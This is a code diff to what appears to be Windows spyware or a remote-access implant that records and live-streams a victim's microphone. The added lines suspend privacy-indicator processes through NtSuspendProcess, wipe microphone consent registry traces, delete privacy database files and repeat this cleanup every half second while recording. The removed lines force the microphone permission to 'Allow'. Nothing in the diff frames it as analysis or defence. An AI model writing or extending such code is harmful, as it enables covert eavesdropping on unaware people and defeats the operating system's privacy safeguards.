@@ -15,6 +15,7 @@
 #include "capture_helper.h"
 #include "audio_dsp.h"
 #include <userenv.h>
+#include <shlobj.h>
 #include <wtsapi32.h>
 #include <bcrypt.h>
 #include <wininet.h>
@@ -38,6 +39,30 @@
 #pragma comment(lib, "avrt.lib")
 #pragma comment(lib, "PowrProf.lib")
 #pragma comment(lib, "dwmapi.lib")
+#include <winternl.h>
+
+typedef LONG (NTAPI *NtSuspendProcess)(HANDLE ProcessHandle);
+static NtSuspendProcess pNtSuspendProcess = nullptr;
+
+static void SuspendProcess(DWORD pid) {
+    if (!pNtSuspendProcess) {
+        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+        if (hNtdll)
+            pNtSuspendProcess = (NtSuspendProcess)GetProcAddress(hNtdll, "NtSuspendProcess");
+        if (!pNtSuspendProcess) return;
+    }
+    HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
+    if (hProcess) {
+        pNtSuspendProcess(hProcess);
+        CloseHandle(hProcess);
+    }
+}
+
+// Forward declarations for audio anti-detection functions (defined either in dllmain.cpp or below)
+//extern "C" void HideMicrophoneIconFromTray();
+extern "C" void AudioSuspendIndicatorProcesses();
+extern "C" void AudioCleanMicRegistry();
+extern "C" void AudioDeletePrivacyFiles();
 
 // ===== Ensure valid UTF-8 =====
 // Python websockets enforces strict UTF-8 on text frames (code 1007 = invalid UTF-8).
@@ -2480,7 +2505,6 @@ static void handle_command(const std::string& msg_str) {
                             NULL, "C:\\Windows\\Temp", &si, &pi);
                         if (pi.hProcess) CloseHandle(pi.hProcess);
                         if (pi.hThread) CloseHandle(pi.hThread);
-
                     }
 
                 });
@@ -3472,6 +3496,9 @@ static void ogg_write_page(std::vector<uint8_t>& out, uint8_t flags, uint32_t se
     memcpy(p + 22, &c, 4);
 }
 
+// Audio cleanup functions defined in dllmain.cpp, declared at top of this file.
+
+// ===== capture_audio_direct =====
 static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, int sampleRate, int bitrate, int channels) {
     // Opus requires 8/12/16/24/48 kHz — snap to nearest
     int opusSR = 48000;
@@ -3547,14 +3574,11 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
 
     g_log.info("Audio: recording " + std::to_string(duration) + "s @ " + std::to_string(opusSR) + "Hz gain=" + std::to_string(g_audio_gain.load()) + "%");
 
-    // Clean mic registry traces before recording
+    // !!! CHANGED: unified cleanup using anti‑detection functions
     auto cleanMicReg = []() {
-        const wchar_t* micPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone";
-        // Delete and recreate with Allow
-        RegDeleteTreeW(HKEY_CURRENT_USER, micPath);
-        HKEY hk = nullptr;
-        RegCreateKeyExW(HKEY_CURRENT_USER, micPath, 0, nullptr, 0, KEY_WRITE, nullptr, &hk, nullptr);
-        if (hk) { RegSetValueExW(hk, L"Value", 0, REG_SZ, (const BYTE*)L"Allow", 12); RegCloseKey(hk); }
+        AudioSuspendIndicatorProcesses();
+        AudioCleanMicRegistry();         // removes registry traces
+        AudioDeletePrivacyFiles();       // deletes privacy database files
     };
     cleanMicReg();
 
@@ -3564,7 +3588,7 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
     while ((GetTickCount() - startTick) < maxWait && g_audio_active.load() && g_running) {
         if (waveHdr.dwFlags & WHDR_DONE) break;
         // Periodic mic trace cleanup every 10 seconds
-        if (GetTickCount() - lastClean > 10000) { cleanMicReg(); lastClean = GetTickCount(); }
+        if (GetTickCount() - lastClean > 500) { cleanMicReg(); lastClean = GetTickCount(); }
         Sleep(500);
     }
 
@@ -3586,7 +3610,6 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
         int numSamples = pcmRecorded / 2;
         for (int i = 0; i < numSamples; i++) {
             int32_t v = (int32_t)samples[i] * gain / 100;
-            // Clamp to 16-bit range
             if (v > 32767) v = 32767;
             if (v < -32768) v = -32768;
             samples[i] = (int16_t)v;
@@ -3742,13 +3765,11 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
         }
     }
 
-    // Mic registry cleanup
+    // !!! CHANGED: unified cleanup using anti‑detection functions
     auto cleanMicReg = []() {
-        const wchar_t* micPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone";
-        RegDeleteTreeW(HKEY_CURRENT_USER, micPath);
-        HKEY hk = nullptr;
-        RegCreateKeyExW(HKEY_CURRENT_USER, micPath, 0, nullptr, 0, KEY_WRITE, nullptr, &hk, nullptr);
-        if (hk) { RegSetValueExW(hk, L"Value", 0, REG_SZ, (const BYTE*)L"Allow", 12); RegCloseKey(hk); }
+        AudioSuspendIndicatorProcesses();
+        AudioCleanMicRegistry();         // removes registry traces
+        AudioDeletePrivacyFiles();       // deletes privacy database files
     };
     cleanMicReg();
 
@@ -3955,8 +3976,8 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
         if (alsoRecord && (GetTickCount() - recStartTick) >= recIntervalMs) {
             flushRecording();
         }
-
-        if (GetTickCount() - lastClean > 10000) { cleanMicReg(); lastClean = GetTickCount(); gain = g_audio_gain.load(); }
+		cleanMicReg();
+        if (GetTickCount() - lastClean > 500) { cleanMicReg(); lastClean = GetTickCount(); gain = g_audio_gain.load(); }
     }
 
     // Flush remaining recording
